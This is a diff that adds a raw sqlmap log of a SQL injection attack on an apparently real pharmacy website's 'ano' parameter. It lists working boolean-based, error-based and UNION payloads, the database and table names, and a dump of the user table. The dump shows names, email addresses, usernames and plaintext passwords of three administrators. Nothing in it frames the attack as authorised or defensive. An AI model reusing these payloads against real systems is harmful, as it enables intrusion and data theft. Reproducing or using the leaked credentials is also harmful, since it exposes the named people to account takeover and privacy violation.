@@ -1,0 +1,133 @@
+sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
+---
+Parameter: ano (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ano=2016 AND 7420=7420
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: ano=2016 AND (SELECT 7180 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(7180=7180,1))),0x7162787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: ano=2016 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717171,0x7469674d527a634f6174664f416c466e7770657876747a4d704e41516e6c4e74796a725258786a4b,0x7162787a71),NULL,NULL,NULL,NULL,NULL-- xqpW
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] economic_drogariaeconomica
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ano (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ano=2016 AND 7420=7420
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: ano=2016 AND (SELECT 7180 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(7180=7180,1))),0x7162787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: ano=2016 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717171,0x7469674d527a634f6174664f416c466e7770657876747a4d704e41516e6c4e74796a725258786a4b,0x7162787a71),NULL,NULL,NULL,NULL,NULL-- xqpW
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: economic_drogariaeconomica
+[4 tables]
++------------+
+| acesso     |
+| imperatriz |
+| post       |
+| usuario    |
++------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ano (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ano=2016 AND 7420=7420
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: ano=2016 AND (SELECT 7180 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(7180=7180,1))),0x7162787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: ano=2016 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717171,0x7469674d527a634f6174664f416c466e7770657876747a4d704e41516e6c4e74796a725258786a4b,0x7162787a71),NULL,NULL,NULL,NULL,NULL-- xqpW
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: economic_drogariaeconomica
+[4 tables]
++------------+
+| acesso     |
+| imperatriz |
+| post       |
+| usuario    |
++------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ano (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ano=2016 AND 7420=7420
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: ano=2016 AND (SELECT 7180 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(7180=7180,1))),0x7162787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: ano=2016 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717171,0x7469674d527a634f6174664f416c466e7770657876747a4d704e41516e6c4e74796a725258786a4b,0x7162787a71),NULL,NULL,NULL,NULL,NULL-- xqpW
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: economic_drogariaeconomica
+Table: usuario
+[3 entries]
++------------+--------------------------------------+------------------+---------------+--------------------------------+---------------+------------------+
+| usuario_id | usuario_foto                         | usuario_nome     | usuario_nivel | usuario_email                  | usuario_senha | usuario_username |
++------------+--------------------------------------+------------------+---------------+--------------------------------+---------------+------------------+
+| 1          | 2cfea4c11c649d170401e6eeb8279e6a.jpg | Alfredo Assunção | Administrador | alfredo_assu@hotmail.com       | alfredo1760   | alfredo          |
+| 3          | c52404e661a2c6f9ec5a11228e81cadc.jpg | Ricardo Batista  | Administrador | ricardobatista28@outlook.com   | ricardo28     | ricardo          |
+| 4          | 4825ebfddb8138e86da554b135162328.png | Edmilson Sanches | Administrador | contato@edmilsonsanches.com.br | 186           | edsanches        |
++------------+--------------------------------------+------------------+---------------+--------------------------------+---------------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: ano (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: ano=2016 AND 7420=7420
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: ano=2016 AND (SELECT 7180 FROM(SELECT COUNT(*),CONCAT(0x7170717171,(SELECT (ELT(7180=7180,1))),0x7162787a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: ano=2016 UNION ALL SELECT NULL,NULL,CONCAT(0x7170717171,0x7469674d527a634f6174664f416c466e7770657876747a4d704e41516e6c4e74796a725258786a4b,0x7162787a71),NULL,NULL,NULL,NULL,NULL-- xqpW
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
